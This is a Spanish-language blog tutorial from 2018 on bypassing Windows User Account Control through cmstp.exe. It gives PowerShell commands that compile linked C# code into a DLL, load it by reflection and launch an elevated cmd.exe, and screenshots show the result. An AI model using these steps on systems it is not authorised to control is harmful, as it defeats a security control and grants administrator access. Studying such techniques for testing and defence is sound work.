+++
date = "2018-11-23"
title = "Mocking the UAC - Bypasseando las nuevas versiones en Windows"
author = "Víctor Rodríguez"
toc = false
+++

Hace unos días, una nueva técnica llamada **mocking** vio la luz en el amplio abanico de métodos para bypassear el UAC (**User Account Control**) en las versiones más recientes de Windows, incluido Windows 10. Como es sabido, el UAC nos da una capa de seguridad ante posibles ataques de malware, evitando que se generen cambios en el registro, se creen ficheros, servicios, etc.

Siguiendo el trabajo de @zc00l y @Oddvar, compilando mediante la consola de powershell un pequeño script en C# que explota el servicio `cmstp.exe`, generamos una DLL que mediante **Reflection.Assembly** cargamos en el sistema, para luego ejecutarla.

[![/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_001.png](/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_001.png)](/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_001.png)

URL del código:

https://github.com/0xVIC/UAC/blob/master/source.cs

```powershell
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
```

El resultado es una DLL `CMSTP-UAC-Bypass.dll` que mediante el método **Assembly.GetExecuting** podemos cargar nuestra DLL y ejecutarla en la misma consola de powershell.

```powershell
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
```

```powershell
[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")
```

[![/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_002.png](/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_002.png)](/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_002.png)

Como resultado obtenemos una nueva ventana CMD de administrador evadiendo el control de acceso de usuarios de nuestra máquina.

[![/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_003.png](/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_003.png)](/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_003.png)

Por último observamos que el nivel de Control de cuentas de usuario está predefinido por el sistema en alto.

[![/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_004.png](/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_004.png)](/images/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows/mocking-the-uac-bypasseando-las-nuevas-versiones-en-windows_004.png)

Happy hacking.

0xVIC